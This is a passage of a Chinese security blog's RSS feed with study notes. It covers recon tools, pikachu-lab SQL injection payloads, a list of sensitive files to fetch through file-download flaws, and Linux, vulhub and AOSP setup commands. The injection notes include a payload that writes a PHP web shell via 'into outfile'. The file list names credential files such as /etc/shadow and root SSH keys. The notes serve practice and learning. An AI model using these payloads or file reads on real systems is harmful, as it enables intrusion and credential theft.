3. 自定义脚本&lt;/p&gt;
&lt;h1 id=&#34;应用识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#应用识别&#34;&gt;#&lt;/a&gt; 应用识别&lt;/h1&gt;
&lt;p&gt;1.Wappalyzer&lt;br /&gt;
2.Whatruns&lt;br /&gt;
3.WafW00f&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VuYWJsZVNlY3VyaXR5L3dhZncwMGY=&#34;&gt;https://github.com/EnableSecurity/wafw00f&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;目录扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录扫描&#34;&gt;#&lt;/a&gt; 目录扫描&lt;/h1&gt;
&lt;p&gt;1.dirb&lt;br /&gt;
2.dirsearch&lt;br /&gt;
3.dir buster&lt;br /&gt;
4.nikto&lt;br /&gt;
5.Aquatone&lt;br /&gt;
6.burp intruder&lt;br /&gt;
7. 各类字典&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RhbmllbG1pZXNzbGVyL1NlY0xpc3Rz&#34;&gt; https://github.com/danielmiessler/SecLists&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;隐藏参数发现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#隐藏参数发现&#34;&gt;#&lt;/a&gt; 隐藏参数发现&lt;/h1&gt;
&lt;p&gt;1.Arjun&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1VsdGltYXRlSGFja2Vycy9Bcmp1bg==&#34;&gt;https://github.com/UltimateHackers/Arjun&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;搜索引擎&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搜索引擎&#34;&gt;#&lt;/a&gt; 搜索引擎&lt;/h1&gt;
&lt;p&gt;1.shodan&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# *country*: 找出指定国家的资产数据 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# *hostname*: 找出指定主机名的资产数据 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# *port*: 找出指定端口的资产数据 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# *os*: 找出指定系统版本的资产数据 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# *before/after*: 指定某个时期的资产数据 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# *city*: 找出指定城市的资产数据 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
2.Censys&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/09/20/pikachu/</guid>
            <title>pikachu</title>
            <link>http://ericcd.com/2022/09/20/pikachu/</link>
            <category term="web" scheme="http://ericcd.com/categories/web/" />
            <category term="web" scheme="http://ericcd.com/tags/web/" />
            <pubDate>Tue, 20 Sep 2022 20:21:49 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录一些在使用 pikahcu 练习时用到的命令。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;获取数据库名&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select database ()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;获取表名&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select group_concat (table_name) from information_schema.tables where table_schema=database ()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;获取列名&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select group_concat (table_name) from information_schema.columns where table_name=&amp;#x27; 表名 &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;读文件&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select load_file (&amp;#x27;Path&amp;#x27;) from 表名 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;写文件&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select &amp;#x27;&amp;lt;!php assert ($_POST [1];?)&amp;gt;&amp;#x27; into outfile &amp;#x27;Path&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;报错回显&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# and updatexml (1,concat (0x7e,(select database ()),0x7e),1))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/08/31/linux-command/</guid>
            <title>linux-command</title>
            <link>http://ericcd.com/2022/08/31/linux-command/</link>
            <category term="linux" scheme="http://ericcd.com/categories/linux/" />
            <category term="linux" scheme="http://ericcd.com/tags/linux/" />
            <pubDate>Wed, 31 Aug 2022 15:02:26 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录一些 linux 环境下会用到的命令。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;设置代理。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# export http_proxy=&amp;#x27;http://windows 的 ip: 代理端口 &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# curl -vv google.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# git config --global https.proxy http://windows 的 ip: 代理端口 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# git config --global https.proxy https://windows 的 ip: 代理端口 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# git config --global http.proxy &amp;#x27;socks5://windows 的 ip: 代理端口 &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# git config --global https.proxy &amp;#x27;socks5://windows 的 ip: 代理端口 &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;批量添加后缀名。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# find . -type f | awk -F &amp;quot;.&amp;quot; &amp;#x27;&amp;#123;print $2&amp;#125;&amp;#x27; | xargs -i -t mv ./&amp;#123;&amp;#125; ./&amp;#123;&amp;#125;.apk&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看 python 版本。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  ls /usr/bin/python*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;添加 python 版本。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看和更换 python 版本。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  update-alternatives --config python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;解决 apt install 失败的问题&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# sudo apt-get install aptitude&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# sudo aptitude install &amp;lt;package-name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 之后从 aptitude 提供的解决方案中选择一种使用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/08/20/file-download/</guid>
            <title>文件包含漏洞可以尝试下载的文件</title>
            <link>http://ericcd.com/2022/08/20/file-download/</link>
            <category term="web" scheme="http://ericcd.com/categories/web/" />
            <category term="web" scheme="http://ericcd.com/tags/web/" />
            <pubDate>Sat, 20 Aug 2022 16:20:20 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录一些利用文件下载漏洞下载的目标文件。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#    Windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\boot.ini// 查看系统版本 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\System32\inetsrv\MetaBase.xml//IIS 配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\repair\sam // 存储系统初次安装的密码 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Program Files\mysql\my.ini//Mysql 配置 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Program Files\mysql\data\mysql\user.MYD//Mysql root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\php.ini//php 配置信息 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\my.ini//Mysql 配置信息 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\win.ini//Windows 系统的一个基本系统配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    Linux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.ssh/id_ras.keystore&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.ssh/known_hosts// 记录每个访问计算机用户的公钥 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /etc/shadow&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /usr/local/app/php5/lib/php.ini//PHP 配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /etc/my.cnf//mysql 配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /etc/httpd/conf/httpd.conf//apache 配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.bash_history// 用户历史命令记录文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.mysql_history//mysql 历史命令记录文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /proc/mounts// 记录系统挂载设备 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /porc/config.gz// 内核配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /var/lib/mlocate/mlocate.db// 全文件路径 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /porc/self/cmdline// 当前进程的 cmdline 参数 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/07/23/vulhub-command/</guid>
            <title>vulhub 相关命令</title>
            <link>http://ericcd.com/2022/07/23/vulhub-command/</link>
            <category term="web" scheme="http://ericcd.com/categories/web/" />
            <category term="web" scheme="http://ericcd.com/tags/web/" />
            <pubDate>Sat, 23 Jul 2022 11:45:16 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;使用 vulhub 时会用到的命令。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;下载-vulhub&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载-vulhub&#34;&gt;#&lt;/a&gt; 下载 vulhub&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# unzip vulhub-master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# cd vulhub-master&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;编译环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#编译环境&#34;&gt;#&lt;/a&gt; 编译环境&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# docker-compose build&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;启动环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#启动环境&#34;&gt;#&lt;/a&gt; 启动环境&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;移除环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#移除环境&#34;&gt;#&lt;/a&gt; 移除环境&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# docker-compose down -v&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/07/19/aosp-related/</guid>
            <title>aosp 配置</title>
            <link>http://ericcd.com/2022/07/19/aosp-related/</link>
            <category term="Android" scheme="http://ericcd.com/categories/Android/" />
            <category term="Android" scheme="http://ericcd.com/tags/Android/" />
            <pubDate>Tue, 19 Jul 2022 19:19:16 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;AOSP 配置过程中遇到的问题。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br /&gt;
 环境：Ubuntu 18.04 ， Python3.6&lt;/p&gt;
&lt;h1 id=&#34;网络问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络问题&#34;&gt;#&lt;/a&gt; 网络问题&lt;/h1&gt;
&lt;p&gt;设置 Proxy 或更换国内源&lt;/p&gt;
&lt;h1 id=&#34;repo-安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#repo-安装&#34;&gt;#&lt;/a&gt; repo 安装&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  mkdir ~/bin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#  PATH=~/bin:$PATH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#  curl https://storage.googleapis.com/git-repo-downloads/repo &amp;gt; ~/bin/repo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#  chmod a+x ~/bin/repo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;python-版本控制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python-版本控制&#34;&gt;#&lt;/a&gt; python 版本控制&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;查看 python 版本：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  ls /usr/bin/python*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;添加 python 版本：&lt;br /&gt;
